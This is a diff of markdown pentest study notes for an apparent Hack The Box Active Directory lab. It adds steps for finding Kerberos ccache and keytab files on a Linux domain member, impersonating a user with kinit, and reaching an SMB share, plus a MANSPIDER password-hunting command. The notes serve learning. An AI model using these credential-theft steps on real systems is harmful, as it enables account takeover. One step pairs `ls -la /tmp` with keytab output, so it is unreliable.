@@ -3623,8 +3623,8 @@ net use Z: \\<IP>\<SHARE_NAME> /user:<DOMAIN>\<USER> <PASSWORD> /persistent:no
 | `-f`   | Find shares via DFS only | `-f` |
 | `-a`   | List shares without file enumeration | `-a` |
 | `-u`   | Pull interesting AD accounts for searches | `-u` |
-| `-d`   | Target domain for computer discovery | `-d inlanefreight.local` |
-| `-c`   | Domain controller for queries | `-c DC01.inlanefreight.local` |
+| `-d`   | Target domain for computer discovery | `-d <DOMAIN>` |
+| `-c`   | Domain controller for queries | `-c DC01.<DOMAIN>` |
 | `-r`   | Max file size to search (bytes) | Default: `500000` (500KB) |
 | `-j`   | Context bytes around found strings | `-j 200` (200 bytes) |
 | `-z`   | Path to config file | `-z config.toml` or `-z generate` |
@@ -3762,7 +3762,7 @@ pipx install git+https://github.com/blacklanternsecurity/MANSPIDER
 **Install (using Docker)**
 
 ```bash
-docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
+docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Password2025!'
 ```
 
 **Usage**
@@ -4763,7 +4763,7 @@ Typical uses of keytab files include:
 
 > **Note:** Any computer that has a Kerberos client installed can create keytab files. Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.
 
-> **Note:** A computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain-joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account `LINUX01$.DOMAIN.LOCAL`
+> **Note:** A computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain-joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account `LINUX01$.<DOMAIN>`
 
 <details>
 <summary><h4>Identifying Linux and Active Directory integration</h4></summary>
@@ -4783,23 +4783,23 @@ realm list
 Expected output:
 
 ```bash
-<DOMAIN>
-  type: kerberos
-  realm-name: <DOMAIN>
-  domain-name: <DOMAIN>
-  configured: kerberos-member
-  server-software: active-directory
-  client-software: sssd
-  required-package: sssd-tools
-  required-package: sssd
-  required-package: libnss-sss
-  required-package: libpam-sss
-  required-package: adcli
-  required-package: samba-common-bin
-  login-formats: %U@<DOMAIN>
-  login-policy: allow-permitted-logins
-  permitted-logins: david@<DOMAIN>, julio@<DOMAIN>
-  permitted-groups: Linux Admins
+# <DOMAIN>
+#   type: kerberos
+#   realm-name: <DOMAIN>
+#   domain-name: <DOMAIN>
+#   configured: kerberos-member
+#   server-software: active-directory
+#   client-software: sssd
+#   required-package: sssd-tools
+#   required-package: sssd
+#   required-package: libnss-sss
+#   required-package: libpam-sss
+#   required-package: adcli
+#   required-package: samba-common-bin
+#   login-formats: %U@<DOMAIN>
+#   login-policy: allow-permitted-logins
+#   permitted-logins: david@<DOMAIN>, julio@<DOMAIN>
+#   permitted-groups: Linux Admins
 ```
 
 </details>
@@ -4816,10 +4816,10 @@ ps -ef | grep -i "winbind\|sssd"
 Expected output:
 
 ```bash
-root        2140       1  0 Sep29 ?        00:00:01 /usr/sbin/sssd -i --logger=files
-root        2141    2140  0 Sep29 ?        00:00:08 /usr/libexec/sssd/sssd_be --domain <DOMAIN> --uid 0 --gid 0 --logger=files
-root        2142    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
-root        2143    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
+# root        2140       1  0 Sep29 ?        00:00:01 /usr/sbin/sssd -i --logger=files
+# root        2141    2140  0 Sep29 ?        00:00:08 /usr/libexec/sssd/sssd_be --domain <DOMAIN> --uid 0 --gid 0 --logger=files
+# root        2142    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
+# root        2143    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
 ```
 
 </details>
@@ -4862,12 +4862,12 @@ crontab -l
 
 ```bash
 # m h  dom mon dow   command
-# *5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
-# carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
+# *5/ * * * * /home/carlos@<DOMAIN>/.scripts/kerberos_script_test.sh
+# carlos@<DOMAIN>@linux01:~$ cat /home/carlos@<DOMAIN>/.scripts/kerberos_script_test.sh
 #!/bin/bash
 
-# kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
-# smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
+# kinit svc_workstations@<DOMAIN> -k -t /home/carlos@<DOMAIN>/.scripts/svc_workstations.kt
+# smbclient //dc01.<DOMAIN>/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@<DOMAIN>/script-test-results.txt
 ```
 
 </details>
@@ -4878,12 +4878,137 @@ crontab -l
 <details>
 <summary><h5>Reviewing environment variables for ccache files</h5></summary>
 
+**Identify the location of our Kerberos credentials cache:**
+
+```bash
+env | grep -i krb5
+```
+
+**Expected output:**
+
+```bash
+# KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
+```
+
 </details>
 
 <details>
 <summary><h5>Searching for ccache files in /tmp</h5></summary>
 
+**Ccache files are located, by default, at /tmp:**
+
+```bash
+ls -la /tmp
+```
+
+**Expected output:**
+
+```bash
+# total 68
+# drwxrwxrwt 13 root                     root                           4096 Oct  6 16:38 .
+# drwxr-xr-x 20 root                     root                           4096 Oct  6  2021 ..
+# -rw-------  1 julio@<DOMAIN>  domain users@<DOMAIN> 1406 Oct  6 16:38 krb5cc_647401106_tBswau
+# -rw-------  1 david@<DOMAIN>  domain users@<DOMAIN> 1406 Oct  6 15:23 krb5cc_647401107_Gf415d
+# -rw-------  1 carlos@<DOMAIN> domain users@<DOMAIN> 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh
+```
+
 </details>
+
+</details>
+
+</details>
+
+<details>
+<summary><h4>Abusing KeyTab files</h4></summary>
+
+A keytab file lists one or more Kerberos principals along with their encrypted secret keys (derived from the user password). To use a keytab file, we need to know which user it was created for.
+
+<details>
+<summary><h5>Read information from a keytab file</h5></summary>
+
+**Read information from a keytab file:**
+
+```bash
+ls -la /tmp
+```
+
+**Expected Output:**
+
+```bash
+# Keytab name: FILE:/opt/specialfiles/carlos.keytab
+# KVNO Timestamp           Principal
+# ---- ------------------- ------------------------------------------------------
+#    1 10/06/2022 17:09:13 carlos@<DOMAIN>
+```
+
+The ticket corresponds to the user Carlos. We can now impersonate the user with kinit.
+
+> **Note:** `kinit` is case-sensitive—ensure you enter the principal exactly as shown in klist. For example, if the keytab shows the username in lowercase and the realm in uppercase, you must match that casing exactly.
+
+</details>
+
+<details>
+<summary><h5>Impersonating a user with a KeyTab</h5></summary>
+
+**Verify the current Kerberos ticket**
+
+```bash
+klist
+```
+
+**Expected Output:**
+
+```bash
+# Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
+# Default principal: david@<DOMAIN>
+
+# Valid starting     Expires            Service principal
+# 10/06/25 17:02:11  10/07/25 03:02:11  krbtgt/<DOMAIN>@<DOMAIN>
+#         renew until 10/07/25 17:02:11
+```
+
+> **Note:** At this point, the active user is david.
+
+
+**Authenticate using the specified keytab, without entering a password.**
+
+```bash
+kinit carlos@<DOMAIN> -k -t /opt/specialfiles/carlos.keytab
+```
+
+**Confirm the change:**
+
+```bash
+klist
+```
+
+**Expected Output:**
+
+```bash
+# Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
+# Default principal: carlos@<DOMAIN>
+
+# Valid starting     Expires            Service principal
+# 10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/<DOMAIN>@<DOMAIN>
+```
+
+> **Note:** The active principal is now carlos, indicating the ticket switched successfully.
+
+**Connecting to SMB Share as Carlos:**
+
+```bash
+smbclient //dc01/carlos -k -c ls
+```
+
+**Expected Output:**
+
+```bash
+#   .                                   D        0  Thu Oct  6 14:46:26 2022
+#   ..                                  D        0  Thu Oct  6 14:46:26 2022
+#   carlos.txt                          A       15  Thu Oct  6 14:46:54 2022
+
+#                 7706623 blocks of size 4096. 4452852 blocks available
+```
 
 </details>
 
